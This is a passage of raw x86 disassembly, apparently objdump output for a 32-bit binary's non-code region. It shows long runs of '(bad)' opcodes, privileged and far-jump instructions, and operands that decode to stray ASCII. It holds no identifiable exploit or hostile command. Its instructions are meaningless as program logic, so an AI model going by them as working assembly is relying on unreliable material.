  4037df:	mov    ebx,0xcf578904
  4037e4:	rcl    BYTE PTR [eax],0x89
  4037e7:	mov    DWORD PTR [ecx+0x68f881b4],ecx
  4037ed:	inc    esp
  4037ee:	cwde   
  4037ef:	test   al,0x3
  4037f1:	adc    ch,BYTE PTR [edi]
  4037f3:	mov    edi,DWORD PTR [eax+0x79]
  4037f6:	inc    edi
  4037f7:	call   0xa2548a3c
  4037fc:	pop    es
  4037fd:	bound  esp,QWORD PTR ds:0x92bffb78
  403803:	push   ecx
  403804:	std    
  403805:	sub    al,0x7b
  403807:	mov    cl,0xc3
  403809:	adc    eax,0x89894f1c
  40380e:	sbb    BYTE PTR [edi+0x898989],0x0
  403815:	add    BYTE PTR [eax],al
  403817:	add    BYTE PTR [eax],al
  403819:	add    BYTE PTR [eax],al
  40381b:	add    BYTE PTR ds:0x8080822,dl
  403821:	or     BYTE PTR [eax],cl
  403823:	or     BYTE PTR [eax],cl
  403825:	or     BYTE PTR [eax],cl
  403827:	or     BYTE PTR [ebp+0x75],dh
  40382a:	call   0x3503bf23
  40382f:	cwde   
  403830:	fnstenv [ebx+edi*4]
  403833:	std    
  403834:	mov    bh,0xf0
  403836:	xchg   ecx,eax
  403837:	and    dh,bl
  403839:	mov    edi,0x7bdc960d
  40383e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40383f:	mov    edi,DWORD PTR [ebp-0x25]
  403842:	jne    0x4038b9
  403844:	div    BYTE PTR [edi]
  403846:	std    
  403847:	mov    ch,0x18
  403849:	adc    DWORD PTR [ebx+0x54],esp
  40384c:	push   esp
  40384d:	sub    ch,BYTE PTR ds:0x506a487f
  403853:	add    eax,ebp
  403855:	mov    edi,ss
  403857:	xor    BYTE PTR [edi-0x3],0x2
  40385b:	hlt    
  40385c:	mov    al,0x29
  40385e:	hlt    
  40385f:	stos   DWORD PTR es:[edi],eax
  403860:	bnd jne 0x4038d8
  403863:	cs xor al,0xef
  403866:	jne    0x4038dd
  403868:	into   
  403869:	data16 lahf 
  40386b:	jne    0x40386d
  40386d:	push   esp
  40386e:	mov    eax,ds:0x33395e9e
  403873:	not    esi
  403875:	js     0x4037f7
  403877:	das    
  403878:	dec    esp
  403879:	jecxz  0x403863
  40387b:	ret    
  40387c:	mov    ebx,0xd39da03f
  403881:	push   esi
  403882:	jp     0x40381e
  403884:	jecxz  0x403886
  403886:	add    BYTE PTR [eax],al
  403888:	inc    ebp
  403889:	dec    edx
  40388a:	add    BYTE PTR [eax],al
  40388c:	or     ebx,DWORD PTR [eax+eax*1-0x74750000]
  403893:	mov    ecx,DWORD PTR [ebx-0x74747475]
  403899:	mov    edx,DWORD PTR [edi-0x7ddee39e]
  40389f:	leave  
  4038a0:	xchg   esi,eax
  4038a1:	addr16 xchg ebx,eax
  4038a3:	push   es
  4038a4:	out    dx,al
  4038a5:	sahf   
  4038a6:	add    al,0x3e
  4038a8:	push   es
  4038a9:	xchg   bl,ah
  4038ab:	jle    0x40385b
  4038ad:	sti    
  4038ae:	cld    
  4038af:	pushf  
  4038b0:	mov    esp,0xdb
	...
  4038bd:	adc    al,0x3d
  4038bf:	cmp    edi,DWORD PTR [eax]
  4038c1:	add    BYTE PTR [eax],al
  4038c3:	imul   ecx,DWORD PTR [edi],0xffffffb2
  4038c6:	test   eax,0xdb095a22
  4038cb:	add    bh,ch
  4038cd:	loop   0x4038b4
  4038cf:	or     ebp,DWORD PTR [eax]
  4038d1:	fwait
  4038d2:	mov    ebp,DWORD PTR [edi]
  4038d4:	add    eax,0x7acd2831
  4038d9:	mov    ebp,edi
  4038db:	push   ebx
  4038dc:	push   ebp
  4038dd:	cwde   
  4038de:	idiv   BYTE PTR [edx]
  4038e0:	gs pop edx
  4038e2:	and    BYTE PTR [edi],bh
  4038e4:	fcmove st,st(0)
  4038e6:	add    BYTE PTR [eax],al
  4038e8:	lods   al,BYTE PTR ds:[esi]
  4038e9:	out    dx,al
  4038ea:	add    BYTE PTR [eax],al
  4038ec:	mov    ds:0x7be5,eax
  4038f1:	rol    DWORD PTR [ecx+0x56],0x59
  4038f5:	lods   al,BYTE PTR ds:[esi]
  4038f6:	sar    DWORD PTR [eax-0x79],cl
  4038f9:	pop    ebx
  4038fa:	in     al,dx
  4038fb:	imul   ecx,eax,0x21645e9b
  403901:	mov    BYTE PTR [esi],ah
  403903:	das    
  403904:	(bad)  
  403905:	repz jb 0x40397b
  403908:	bound  eax,QWORD PTR [eax]
  40390a:	add    BYTE PTR [eax],al
  40390c:	mov    dh,0x4c
  40390e:	aaa    
  40390f:	pop    ebp
  403910:	pop    ebx
  403911:	lods   eax,DWORD PTR ds:[esi]
  403912:	sbb    eax,0xd9c076
  403917:	xor    DWORD PTR [edi-0x4ade1bad],ebp
  40391d:	and    ch,BYTE PTR [ebx+0x6c17fdb0]
  403923:	iret   
  403924:	pop    DWORD PTR [esi]
  403926:	sub    ebx,DWORD PTR [ebx]
  403928:	dec    edi
  403929:	add    BYTE PTR [eax],al
  40392b:	or     al,0xd5
  40392d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40392e:	add    BYTE PTR [eax],al
  403930:	add    BYTE PTR [ecx-0x76767677],cl
  403936:	mov    DWORD PTR [ecx-0x7f097677],ecx
  40393c:	pop    edi
  40393d:	push   eax
  40393e:	push   eax
  40393f:	push   eax
  403940:	push   eax
  403941:	push   eax
  403942:	push   eax
  403943:	push   eax
  403944:	push   eax
  403945:	push   eax
  403946:	add    BYTE PTR [eax],al
  403948:	pop    DWORD PTR [edx-0x7]
  40394b:	jmp    0xf40a8662
  403950:	adc    esp,DWORD PTR [esi-0x18089ec9]
  403956:	icebp  
  403957:	(bad)  
  403959:	add    dh,cl
  40395b:	and    dh,BYTE PTR [esi+0x4fcbbc]
  403961:	add    BYTE PTR [esi-0x5effff08],ch
  403967:	ret    0x0
  40396a:	ins    DWORD PTR es:[edi],dx
  40396b:	and    ecx,ebx
  40396d:	aaa    
  40396e:	pushf  
  40396f:	fcomp  DWORD PTR [eax]
  403971:	repz inc eax
  403973:	jmp    0x4d78:0xf31811f0
  40397a:	leave  
  40397b:	inc    esi
  40397c:	jmp    0xcd:0xe9f3efae
  403983:	je     0x4039e4
  403985:	inc    edi
  403986:	addr16 je 0x4039fd
  403989:	je     0x4039ff
  40398b:	xor    al,0x78
  40398d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40398e:	xchg   ebx,eax
  40398f:	sub    dl,0x21
  403992:	ret    0x22b1
  403995:	inc    DWORD PTR ds:0x1419292
  40399b:	xchg   esi,eax
  40399c:	dec    esp
  40399d:	dec    esi
  40399e:	cmp    eax,0xd4686be
  4039a3:	pop    ebp
  4039a4:	dec    edx
  4039a5:	loop   0x40398d
  4039a7:	xor    eax,eax
  4039a9:	mov    ah,0xf2
  4039ab:	jne    0x4039e7
  4039ad:	retf   
  4039ae:	je     0x403a24
  4039b0:	cmovo  esi,DWORD PTR [esp+esi*2+0x74]
  4039b5:	(bad)  
  4039b6:	(bad)  
  4039b7:	(bad)  
  4039b8:	(bad)  
  4039b9:	(bad)  
  4039ba:	(bad)  
  4039bb:	(bad)  
  4039bc:	(bad)  
  4039bd:	(bad)  
  4039be:	fisubr DWORD PTR [ebx-0x8f]
  4039c4:	(bad)  
  4039c5:	(bad)  
  4039c6:	(bad)  
  4039c7:	(bad)  
  4039c8:	(bad)  
  4039c9:	inc    DWORD PTR [ebp-0x3b2267b]
  4039cf:	mov    cl,0xff
  4039d1:	aaa    
  4039d2:	fsubr  DWORD PTR [ebx]
  4039d4:	in     al,0xc3
  4039d6:	add    DWORD PTR [edx-0x6ad75c86],ebp
  4039dc:	xchg   dh,al
  4039de:	mov    eax,0x3522517b
  4039e3:	rol    BYTE PTR [ebp-0x6c4c467b],cl
  4039e9:	sqrtps xmm2,xmm0
  4039ec:	sti    
  4039ed:	adc    DWORD PTR [ebx],ebp
  4039ef:	push   0xed1da24a
  4039f4:	clc    
  4039f5:	cmp    BYTE PTR [ebx-0x37],0xf4
  4039f9:	mov    ebp,0x3690939
  4039fe:	sbb    eax,0x68a3dbaa
  403a03:	test   DWORD PTR [ebp-0x7a552ea8],eax
  403a09:	test   DWORD PTR [ebp+0x850092],edx
  403a0f:	sahf   
  403a10:	fmul   QWORD PTR [eax]
  403a12:	jns    0x4039f3
  403a14:	add    ebx,0x726c3c20
  403a1a:	bound  eax,QWORD PTR [ebx+0x2f]
  403a1d:	outs   dx,DWORD PTR ds:[esi]
  403a1e:	and    BYTE PTR [esi+0x73],dh
  403a21:	jns    0x403a96
  403a23:	imul   ebp,DWORD PTR [esi+0x70],0x6d22656d
  403a2a:	and    dl,BYTE PTR [edi+0x20]
  403a2d:	addr16 jae 0x403a95
  403a30:	bound  esi,QWORD PTR [esi+0x65]
  403a33:	arpl   WORD PTR [ebp+0xa],sp
  403a36:	or     eax,0x6f666d69
  403a3b:	gs cmp eax,0x6c200a76
  403a41:	and    ah,BYTE PTR [eax+eiz*1+0x20]
  403a45:	and    BYTE PTR [ecx+0x22],ch
  403a48:	bound  ebx,QWORD PTR [ebx+0x69]
  403a4b:	and    BYTE PTR [edx],ah
  403a4d:	jb     0x403a6f
  403a4f:	ins    DWORD PTR es:[edi],dx
  403a50:	arpl   WORD PTR [esi],bp
  403a52:	out    0x9a,eax
  403a54:	shl    DWORD PTR [edx+0x5befcf8],0x13
  403a5b:	inc    ebp
  403a5c:	stos   BYTE PTR es:[edi],al
  403a5d:	not    al
  403a5f:	fisub  DWORD PTR [edx+0x5f]
  403a62:	push   0xbe000000
  403a67:	add    BYTE PTR gs:[eax],al
  403a6a:	xor    eax,0x33000000
  403a70:	xor    esi,DWORD PTR [ebx]
  403a72:	xor    esi,DWORD PTR [ebx]
  403a74:	xor    esi,DWORD PTR [ebx]
  403a76:	xor    esi,DWORD PTR [ebx]
  403a78:	mov    eax,DWORD PTR [esi]
  403a7a:	jo     0x403ae0
  403a7c:	call   0x86e20245
  403a81:	jnp    0x403a0a
  403a83:	xchg   esi,eax
  403a84:	cli    
  403a85:	aaa    
  403a86:	fwait
  403a87:	lods   eax,DWORD PTR ds:[esi]
  403a88:	jne    0x403a56
  403a8a:	xor    al,0xde
  403a8c:	rcl    DWORD PTR [esi-0x952],1
  403a92:	(bad)  
  403a93:	(bad)  
  403a94:	(bad)  
  403a95:	(bad)  
  403a96:	(bad)  
  403a97:	(bad)  
  403a98:	push   DWORD PTR [ebp+0x75]
  403a9b:	cmp    ebp,ebx
  403a9d:	ins    DWORD PTR es:[edi],dx
  403a9e:	push   DWORD PTR [ebp+0x75]
  403aa1:	jmp    0xfcfc00b3
  403aa6:	inc    ecx
  403aa7:	mov    al,ds:0x81554b92
  403aac:	xor    eax,0x8f593d5a
  403ab1:	sar    BYTE PTR [ecx+0x63214534],cl
  403ab7:	in     al,dx
  403ab8:	push   edx
  403ab9:	icebp  
  403aba:	loope  0x403ac6
  403abc:	shr    BYTE PTR [edi-0x43731b43],0xb7
  403ac3:	ds jne 0x403b3b
  403ac6:	dec    ecx
  403ac7:	mov    ds:0x491b7575,eax
  403acc:	(bad)  
  403acd:	jne    0x403b14
  403acf:	mov    BYTE PTR [edx+0x4328ab48],dh
  403ad5:	mov    DWORD PTR [esi],0xf15965c2
  403adb:	pop    ebp
  403adc:	inc    edx
  403add:	jo     0x403b1f
  403adf:	jmp    0x8083db77
  403ae4:	fadd   QWORD PTR [ebx]
  403ae6:	or     al,BYTE PTR [ebp+0x45]
  403ae9:	inc    ebp
  403aea:	cld    
  403aeb:	imul   ebx,eax,0x6c
  403aee:	mov    al,BYTE PTR [esi-0x53]
  403af1:	shl    DWORD PTR [ebp+0xb],1
  403af4:	cli    
  403af5:	jnp    0x403a8b
  403af7:	jnp    0x403ac0
  403af9:	loop   0x403aad
  403afb:	inc    ecx
  403afc:	pop    ss
  403afd:	test   al,0x1f
  403aff:	shr    ebx,0xe0
  403b02:	mov    bh,0xf5
  403b04:	test   ecx,edi
  403b06:	inc    esi
  403b07:	inc    ebp
  403b08:	inc    ebp
  403b09:	cmp    eax,0x454538cd
  403b0e:	inc    ebp
	...
  403b17:	add    BYTE PTR [eax],cl
  403b19:	pop    edi
  403b1a:	push   ebp
  403b1b:	add    al,0x4
  403b1d:	add    al,0x4
  403b1f:	add    al,0x4
  403b21:	add    al,0x4
  403b23:	add    al,0xcc
  403b25:	int3   
  403b26:	sbb    DWORD PTR [edi+0x63905188],ebx
  403b2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403b2d:	push   eax
  403b2e:	inc    edx
  403b2f:	sahf   
  403b30:	xchg   edi,eax
  403b31:	jl     0x403b33
  403b33:	popf   
  403b34:	sub    eax,0x76f97ad1
  403b39:	ins    BYTE PTR es:[edi],dx
  403b3a:	jne    0x403b33
  403b3c:	jmp    FWORD PTR [ecx-0x34]
  403b3f:	int3   
  403b40:	push   ebp
  403b41:	pop    esp
  403b42:	int3   
  403b43:	int3   
  403b44:	sbb    eax,0x79cccccc
  403b49:	pop    ebp
  403b4a:	call   0x170571a
  403b4f:	push   eax
  403b50:	push   ebx
  403b51:	sbb    DWORD PTR [edi+0x6f34f383],eax
  403b57:	mov    esi,0xca8c95df
  403b5c:	in     eax,dx
  403b5d:	pushf  
  403b5e:	in     eax,dx
  403b5f:	or     eax,0xca6c00cc
  403b64:	xor    esp,DWORD PTR ds:0xe1000000
  403b6a:	push   ebx
  403b6b:	in     eax,0x9c
  403b6d:	lods   eax,DWORD PTR ds:[esi]
  403b6e:	dec    eax
  403b6f:	popf   
  403b70:	pop    dx
  403b72:	fcom   QWORD PTR [ecx+0x7bc842d]
  403b78:	cwde   
  403b79:	jno    0x403be0
  403b7b:	or     dh,BYTE PTR [ebx+0x3562eb53]
  403b81:	call   0x7d4a7f0b
  403b86:	aam    0xfc
  403b88:	or     eax,0xff18c9
  403b8d:	add    dh,al
  403b8f:	sub    eax,DWORD PTR [eax]
  403b91:	add    BYTE PTR [eax],al
  403b93:	(bad)  
  403b94:	(bad)  
  403b95:	(bad)  
  403b96:	(bad)  
  403b97:	(bad)  
  403b98:	(bad)  
  403b99:	(bad)  
  403b9a:	(bad)  
  403b9b:	call   FWORD PTR [ecx+0x2c]
  403b9e:	xchg   esp,eax
  403b9f:	add    al,0x4
  403ba1:	add    al,0x4
  403ba3:	add    al,0x4
  403ba5:	add    al,0x4
  403ba7:	add    al,0x0
  403ba9:	add    BYTE PTR [edx+0x35],ah
  403bac:	scas   al,BYTE PTR es:[edi]
  403bad:	stos   BYTE PTR es:[edi],al
  403bae:	dec    edx
  403baf:	call   FWORD PTR [ebx]
  403bb1:	fnstenv [edi+0x2]
  403bb4:	nop
  403bb5:	sub    BYTE PTR [ebx],dl
  403bb7:	lahf   
  403bb8:	dec    ebp
  403bb9:	stc    
  403bba:	cmc    
  403bbb:	enter  0x49d1,0xf0
  403bbf:	push   esi
  403bc0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403bc1:	fld    DWORD PTR [eax]
  403bc3:	add    BYTE PTR [ebx],al
  403bc5:	lods   eax,DWORD PTR ds:[esi]
  403bc6:	aaa    
  403bc7:	adc    dh,BYTE PTR [edx]
  403bc9:	dec    edx
  403bca:	xchg   DWORD PTR gs:[eax+0x70],ebx
  403bce:	jecxz  0x403c00
  403bd0:	fdiv   QWORD PTR [edx]
  403bd2:	call   0xd045:0x9b396fcf
  403bd9:	push   0xffffffb2
  403bdb:	popa   
  403bdc:	scas   eax,DWORD PTR es:[edi]
  403bdd:	xor    ah,BYTE PTR [eax+0x4de2]
  403be3:	mov    bh,0x7
  403be5:	ins    BYTE PTR es:[edi],dx
  403be6:	add    BYTE PTR [eax],al
  403be8:	out    0xb5,al
  403bea:	jns    0x403bec
  403bec:	je     0x403c49
  403bee:	popa   
  403bef:	out    0x1c,eax
  403bf1:	test   al,0x65
  403bf3:	jb     0x403bba
  403bf5:	mov    dh,0xae
  403bf7:	ins    DWORD PTR es:[di],dx
  403bf9:	in     al,dx
  403bfa:	mov    ch,0xf3
  403bfc:	(bad)  
  403bfd:	jnp    0x403c54
  403bff:	jecxz  0x403c70
  403c01:	pop    ss
  403c02:	push   ebx
  403c03:	mov    ds:0x747474ab,al
  403c08:	or     DWORD PTR fs:[esp+esi*2+0x65],esi
  403c0d:	cmp    al,0x75
  403c0f:	das    
  403c10:	outs   dx,DWORD PTR ds:[esi]
  403c11:	jb     0x403c7c
  403c13:	bound  edi,QWORD PTR [edi*1+0x65642273]
  403c1a:	cmp    ah,BYTE PTR [ebp+0x63]
  403c1d:	bound  edi,QWORD PTR [ecx+0x50]
  403c20:	push   ebx
  403c21:	ds ins DWORD PTR es:[edi],dx
  403c23:	cmp    al,0x62
  403c25:	gs jne 0x403c48
  403c28:	cmp    al,0x69
  403c2a:	imul   ebp,DWORD PTR [edi+0x29],0x653c5762
  403c31:	das    
  403c32:	arpl   WORD PTR [ebp+0x20],bp
  403c35:	gs jae 0x403ca7
  403c38:	bound  ebp,QWORD PTR [eax]
  403c3a:	data16 and BYTE PTR [eax],ah
  403c3d:	ins    DWORD PTR es:[edi],dx
  403c3e:	imul   esi,DWORD PTR [esi+edi*1+0x74],0x70726165
  403c46:	jb     0x403c76
  403c48:	je     0x403caf
  403c4a:	arpl   WORD PTR [edx+0xd],si
  403c4d:	cs jae 0x403c7e
  403c50:	imul   ebp,DWORD PTR [edi+0x6e],0x676e6574
  403c57:	imul   ebp,DWORD PTR gs:[ecx+0x65],0x2e6d6974
  403c5f:	je     0x403cc2
  403c61:	jae    0x403c9d
  403c63:	sub    eax,0x83747474
  403c68:	add    DWORD PTR [ebx-0x7c7c7c7d],0xffffff83
  403c6f:	adc    DWORD PTR [edx-0x1bc7f114],0x62
  403c76:	pop    es
  403c77:	mov    dh,0xe1
  403c79:	ds dec ebx
  403c7b:	cmp    al,0x1
  403c7d:	into   
  403c7e:	(bad)  
  403c7f:	and    DWORD PTR [edx+0x5d],ebp
  403c82:	arpl   WORD PTR [esi+0x1e],bx
  403c85:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403c86:	popf   
  403c87:	pop    ds
  403c88:	(bad)  
  403c89:	(bad)  
  403c8a:	(bad)  
  403c8b:	(bad)  
  403c8c:	(bad)  
  403c8d:	(bad)  
  403c8e:	(bad)  
  403c8f:	(bad)  
  403c90:	(bad)  
  403c91:	call   0x71013a7e
  403c96:	pop    edx
  403c97:	call   0x9a50d084
  403c9c:	cmp    DWORD PTR [ebx-0x72],ecx
  403c9f:	jne    0x403d08
  403ca1:	or     esp,ecx
  403ca3:	rol    DWORD PTR [edx],1
  403ca5:	xor    eax,0x8681f7c
  403caa:	jmp    DWORD PTR [ecx+esi*4-0x2544db27]
  403cb1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403cb2:	shl    BYTE PTR [esi+0x1f7c4d1d],0x26
  403cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403cba:	mov    eax,0x1ae8e883
  403cbf:	mov    ch,0xe8
  403cc1:	call   0xe901aca0
  403cc6:	or     al,0xca
  403cc8:	cli    
  403cc9:	mov    gs,ebx
  403ccb:	pop    es
  403ccc:	push   eax
  403ccd:	xchg   ebx,eax
  403cce:	out    0xf7,eax
  403cd0:	les    esp,FWORD PTR [ecx]
  403cd2:	mov    esp,DWORD PTR [edi-0x4ffc3de3]
  403cd8:	ins    DWORD PTR es:[edi],dx
  403cd9:	push   ebx
  403cda:	or     dl,BYTE PTR [esi-0x12]
  403cdd:	jne    0x403cf7
  403cdf:	or     al,0xc
  403ce1:	or     al,0xd7
  403ce3:	das    
  403ce4:	inc    esp
  403ce5:	dec    ebx
  403ce6:	or     al,0x24
  403ce8:	push   eax
  403ce9:	dec    esi
  403cea:	addr16 mov ecx,0x68eaff71
  403cf0:	inc    edx
  403cf1:	pop    ecx
  403cf2:	push   ds
  403cf3:	inc    esp
  403cf4:	pop    es
  403cf5:	jnp    0x403cd8
  403cf7:	jno    0x403d39
  403cf9:	jnp    0x403d45
  403cfb:	cld    
  403cfc:	sub    eax,0xc0c59d0
  403d01:	lods   eax,DWORD PTR ds:[esi]
  403d02:	sub    al,0x2
  403d04:	or     al,0xc
  403d06:	or     al,0xe8
  403d08:	call   0xe92925f5
  403d0d:	call   0xd59d25fa
  403d12:	ja     0x403d14
	...
  403d1c:	add    BYTE PTR [eax],al
  403d1e:	mov    eax,ds
  403d20:	adc    al,0xfa
  403d22:	test   al,0x7a
  403d24:	push   ebx
  403d25:	ret    
  403d26:	and    ah,BYTE PTR [ecx+0x11a2a548]
  403d2c:	cmp    al,0x40
  403d2e:	not    cl
  403d30:	mov    edx,0x3d31c09b
  403d35:	data16 add BYTE PTR [eax],al
  403d38:	fst    DWORD PTR ds:0x355b0000
  403d3e:	add    BYTE PTR [eax],al
  403d40:	xchg   edi,eax
  403d41:	into   
  403d42:	test   al,0x96
  403d44:	cdq    
  403d45:	and    BYTE PTR [edi+0xb],bh
  403d48:	lods   eax,DWORD PTR ds:[esi]
  403d49:	dec    ebx
  403d4a:	cmp    eax,0x7098af8c
  403d4f:	mov    ecx,0x9cb9788b
  403d54:	scas   eax,DWORD PTR es:[edi]
  403d55:	or     ebx,DWORD PTR [esi-0x5874ff03]
  403d5b:	fwait
  403d5c:	jae    0x403dcf
  403d5e:	mov    ecx,DWORD PTR [ebx+0x40dcc08b]
  403d64:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403d65:	dec    ebx
  403d66:	pop    es
  403d67:	sub    BYTE PTR [esi-0x76],0x75
  403d6b:	mov    eax,0xe655fdb7
  403d70:	mov    fs,WORD PTR [eax+edx*1-0x56b53e60]
  403d77:	dec    eax
  403d78:	or     al,0xcd
  403d7a:	mov    edx,0x408783cf
  403d7f:	js     0x8b863dc8
  403d85:	mov    eax,DWORD PTR [ebp+0x32]
  403d88:	mov    ecx,DWORD PTR [ebx-0x75]
  403d8e:	(bad)  
  403d8f:	(bad)  
  403d90:	(bad)  
  403d91:	(bad)  
  403d92:	(bad)  
  403d93:	(bad)  
  403d94:	fisttp QWORD PTR [esi-0x38]
  403d97:	rol    al,0xc0
  403d9a:	rol    al,0xc0
  403d9d:	rol    al,0xc0
  403da0:	push   0x6a
  403da2:	dec    ebx
  403da3:	inc    ebp
  403da4:	stos   BYTE PTR es:[edi],al
  403da5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403da6:	and    al,0xe8
  403da8:	js     0x403db8
  403daa:	mov    eax,ds:0xa4eb269c
  403daf:	iret   
  403db0:	mov    bl,0x65
  403db2:	push   cs
  403db3:	test   edi,edx
  403db5:	iret   
  403db6:	js     0x403d82
  403db8:	shr    BYTE PTR [eax+0x6a],1
  403dbb:	push   0xffffffbc
  403dbd:	fidiv  DWORD PTR [ebx]
  403dbf:	xor    dh,dh
  403dc1:	pop    ebp
  403dc2:	scas   al,BYTE PTR es:[edi]
  403dc3:	mov    edi,0xce5ce016
  403dc8:	push   ebx
  403dc9:	outs   dx,DWORD PTR ds:[esi]
  403dca:	fs out dx,al
  403dcc:	out    0x4d,eax
  403dce:	in     al,0xc3
  403dd0:	push   es
  403dd1:	ror    BYTE PTR [edi-0x78],cl
  403dd4:	and    dl,BYTE PTR [eax+0x6ad07969]
  403dda:	push   0x6a
  403ddc:	je     0x403e2d
  403dde:	push   0x6a
  403de0:	repz popa 
  403de2:	retf   
  403de3:	push   0x0
  403de5:	fnsave [edi]
  403de7:	dec    edx
  403de8:	ja     0x403d86
  403dea:	sbb    eax,0x5574f14c
  403def:	jb     0x403e33
  403df1:	dec    esi
  403df2:	dec    esp
  403df3:	sbb    al,0x81
  403df5:	fwait
  403df6:	outs   dx,DWORD PTR ds:[esi]
  403df7:	pop    edi
  403df8:	xor    eax,0xc1a48e75
  403dfd:	add    BYTE PTR [eax],al
  403dff:	add    BYTE PTR [eax],ch
  403e01:	sbb    al,BYTE PTR [eax]
  403e03:	add    BYTE PTR [ebx-0x3d],ch
	...
  403e12:	fs es lahf 
  403e15:	push   esp
  403e16:	retf   
  403e17:	jle    0x403e0b
  403e19:	push   edx
  403e1a:	or     ecx,DWORD PTR [edx]
  403e1c:	and    al,0x87
  403e1e:	out    0xf0,eax
  403e20:	repnz pusha 
  403e22:	mov    esi,0xcb6f50e7
  403e27:	fsub   DWORD PTR [esi+0x0]
  403e2d:	add    BYTE PTR [eax],al
  403e2f:	add    BYTE PTR [eax],al
  403e31:	add    BYTE PTR [eax],al
  403e33:	jne    0x403eaa
  403e35:	xchg   ebp,eax
  403e36:	shr    al,0x6a
  403e39:	jne    0x403eb0
  403e3b:	xchg   ebx,eax
  403e3c:	and    eax,DWORD PTR [edi+0x6550883]
  403e42:	repz sbb DWORD PTR [ecx+ebx*8+0x72],ebp
  403e47:	sbb    ebp,DWORD PTR [ebx]
  403e49:	add    BYTE PTR [eax+edi*8+0x54ce7cea],al
  403e50:	and    eax,0xb3d9d10e
  403e55:	pop    edx
  403e56:	sbb    DWORD PTR [esi],ebp
  403e58:	div    DWORD PTR [eax-0x65]
  403e5b:	pop    edi
  403e5c:	out    dx,al
  403e5d:	cmp    DWORD PTR [ebp+0x75],esi
  403e60:	mov    esi,0xc075750d
  403e65:	xor    ecx,DWORD PTR [edx]
  403e67:	jne    0x403df2
  403e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403e6a:	adc    eax,0x26c4cc1b
  403e6f:	es test al,0x82
  403e72:	jae    0x403e51
  403e74:	xchg   ecx,eax
  403e75:	lds    edi,FWORD PTR [esi+0x56]
  403e78:	xchg   edx,eax
  403e79:	leave  
  403e7a:	xchg   edx,eax
  403e7b:	mov    esi,0x4e486504
  403e80:	pop    edx
  403e81:	mov    DWORD PTR [ecx-0x67162277],ecx
  403e87:	loop   0x403ee1
  403e89:	jno    0x403ed3
  403e8b:	ins    DWORD PTR es:[edi],dx
  403e8c:	daa    
  403e8d:	mov    al,0xcf
  403e8f:	xchg   ebx,eax
  403e90:	dec    ecx
  403e91:	xor    BYTE PTR [eax+0x5ac93ed5],cl
  403e97:	pop    esp
  403e98:	sbb    DWORD PTR [ecx+0x66],ebx
  403e9b:	dec    esp
  403e9c:	(bad)  
  403e9e:	and    BYTE PTR [eax],ah
  403ea0:	lods   al,BYTE PTR ds:[esi]
  403ea1:	mov    DWORD PTR [ecx-0x769c7d26],ecx
  403ea7:	mov    DWORD PTR [ecx-0x7a7a7a7b],ecx
  403ead:	test   DWORD PTR [ebp-0x797a7a7b],eax
  403eb3:	sahf   
  403eb4:	cmp    al,0x0
	...
  403ebe:	(bad)  
  403ebf:	dec    DWORD PTR [esi+0x6c5db447]
  403ec5:	ins    BYTE PTR es:[edi],dx
  403ec6:	and    eax,0x20657e3f
  403ecb:	data16 jl 0x403ea8
  403ece:	fiadd  DWORD PTR [esi+0x40]
  403ed1:	add    BYTE PTR [eax+0x2771cb0f],dl
  403ed7:	pop    esi
  403ed8:	(bad)  
  403ed9:	jmp    DWORD PTR [edx+0x1effff24]
  403edf:	pop    ebp
  403ee0:	(bad)  
  403ee1:	inc    edi
  403ee3:	adc    BYTE PTR [ebx],ah
  403ee5:	outs   dx,BYTE PTR ds:[esi]
  403ee6:	bound  esi,QWORD PTR [esi+ebp*2+0x69]
  403eea:	arpl   WORD PTR gs:[ecx+0x3c],bp
  403eee:	addr16 gs cmp eax,0x79747276
  403ef5:	and    BYTE PTR [eax+0x70],dh
  403ef8:	and    BYTE PTR [edx+0x73],ah
  403efb:	and    BYTE PTR [ebx+0x57],dh
  403efe:	bound  ebp,QWORD PTR [ecx+0x65]
  403f01:	jo     0x403f68
  403f03:	ins    DWORD PTR es:[edi],dx
  403f04:	push   ebx
  403f05:	jne    0x403f6c
  403f07:	outs   dx,DWORD PTR ds:[esi]
  403f08:	ja     0x403f38
  403f0a:	sub    BYTE PTR [ecx+0x77],ch
  403f0d:	ins    DWORD PTR es:[edi],dx
  403f0e:	and    BYTE PTR ds:[esi],ch
  403f11:	gs je  0x403f7d
  403f14:	ins    DWORD PTR es:[edi],dx
  403f15:	ins    DWORD PTR es:[di],dx
  403f17:	imul   ecx,DWORD PTR [edx],0x6f617453
  403f1d:	cs js  0x403f77
  403f20:	dec    ebp
  403f21:	gs gs cmp al,0x79
  403f25:	bound  ecx,QWORD PTR [edx]
  403f27:	jae    0x403f49
  403f29:	imul   edx,DWORD PTR [ebx+0x65],0x6c687661
  403f30:	ds jo  0x403f98
  403f33:	cmp    al,0x52
  403f35:	jae    0x403f5f
  403f37:	or     eax,0xd69656d
  403f3c:	arpl   WORD PTR [esi+0x6d],ax
  403f3f:	push   eax
  403f40:	and    BYTE PTR [eax],ah
  403f42:	push   ebx
  403f43:	push   ebx
  403f44:	dec    ebp
  403f45:	gs je  0x403fba
  403f48:	cs jb  0x403f9d
  403f4b:	imul   esp,DWORD PTR [edx],0x653d203e
  403f51:	gs and BYTE PTR gs:[ebp+0x3a],bl
  403f56:	jo     0x403fbd
  403f58:	sub    DWORD PTR [edx+0xa],esi
  403f5b:	xor    eax,0x3445acb4
  403f60:	not    esp
  403f62:	or     al,0xc3
  403f64:	cmp    al,0x74
  403f66:	scas   al,BYTE PTR es:[edi]
  403f67:	lea    eax,[ebx]
  403f69:	sbb    edi,DWORD PTR [ebx-0x35]
  403f6c:	call   0xff:0xfbb366cc
  403f73:	call   0x0:0x467a5f
  403f7a:	xchg   edx,eax
  403f7b:	fsub   DWORD PTR [eax+0x21039c1f]
  403f81:	imul   esp,ecx,0x5c
  403f84:	cmp    eax,0x19aec269
  403f89:	jl     0x403fa5
  403f8b:	cmp    al,0x8c
  403f8d:	imul   ecx,DWORD PTR [ebx+0x4e110604],0xaf73249c
